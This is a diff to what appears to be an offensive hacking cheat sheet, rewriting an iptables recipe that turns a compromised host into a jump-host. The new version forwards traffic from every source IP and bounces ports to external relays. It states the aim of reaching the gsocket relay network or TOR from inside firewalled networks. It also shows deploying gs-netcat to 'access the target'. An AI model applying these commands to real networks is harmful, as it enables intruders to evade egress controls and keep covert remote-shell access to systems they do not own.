@@ -604,19 +604,29 @@ More: [https://github.com/twelvesec/port-forwarding](https://github.com/twelvese
 
 Use the host 192.168.0.100 as a Jump-Host: Forward any connection from anywhere to 192.168.0.100:53 onwards to 1.2.3.4:443.
 ```sh
-FPORT=53
-DSTIP=1.2.3.4
-DPORT=443
-echo 1 >/proc/sys/net/ipv4/ip_forward
+ipfwinit() {
+    echo 1 >/proc/sys/net/ipv4/ip_forward
+    echo 1 >/proc/sys/net/ipv4/conf/all/route_localnet
+    [ $# -le 0 ] && set -- "0.0.0.0/0"
+    while [ $# -gt 0 ]; do
+        iptables -t mangle -I PREROUTING -s "${1}" -p tcp -m addrtype --dst-type LOCAL -m conntrack ! --ctstate ESTABLISHED -j MARK --set-mark 1188 
+        shift 1
+    done
+    iptables -t mangle -D PREROUTING -j CONNMARK --restore-mark >/dev/null 2>/dev/null
+    iptables -t mangle -I PREROUTING -j CONNMARK --restore-mark
+    iptables -I FORWARD -m mark --mark 1188 -j ACCEPT
+    iptables -t nat -I POSTROUTING -m mark --mark 1188 -j MASQUERADE
+    iptables -t nat -I POSTROUTING -m mark --mark 1188 -j CONNMARK --save-mark
+}
+ipfwinit                             # Allow EVERY IP to bounce
+# ipfwinit "1.2.3.4/16" "6.6.0.0/16" # Only allow these SOURCE IP's to bounce
+```
 
-iptables -t mangle -C PREROUTING -j CONNMARK --restore-mark || iptables -t mangle -I PREROUTING -j CONNMARK --restore-mark
-iptables -t mangle -A PREROUTING -p tcp --dport ${FPORT:?} -m addrtype --dst-type LOCAL -j MARK --set-mark 1188 
-
-iptables -t nat -I PREROUTING -p tcp -m mark --mark 1188 -j DNAT --to ${DSTIP:?}:${DPORT:?}
-iptables -I FORWARD -m mark --mark 1188 -j ACCEPT
-
-iptables -t nat -I POSTROUTING -m mark --mark 1188 -j MASQUERADE
-iptables -t nat -I POSTROUTING -m mark --mark 1188 -j CONNMARK --save-mark
+Then set forwards like so:
+```sh
+ipfw 31337 144.76.220.20 22 # Bounce 31337 to segfault's ssh port.
+ipfw 31338 127.0.0.1 8080   # Bounce 31338 to the server's 8080 (localhost)
+ipfw 53 213.171.212.212 443 # Bounce 53 to gsrn-relay on port 443
 ```
 
 We use this trick to reach the gsocket-relay-network (or TOR) from deep inside firewalled networks.
@@ -626,7 +636,7 @@ GS_HOST=192.168.0.100 GS_PORT=53 ./deploy.sh
 ```
 ```sh
 # Access the target  
-GS_HOST=1.2.3.4: GS_PORT=443 gs-netcat -i -s ...
+GS_HOST=213.171.212.212 gs-netcat -i -s ...
 ```
 
 ---
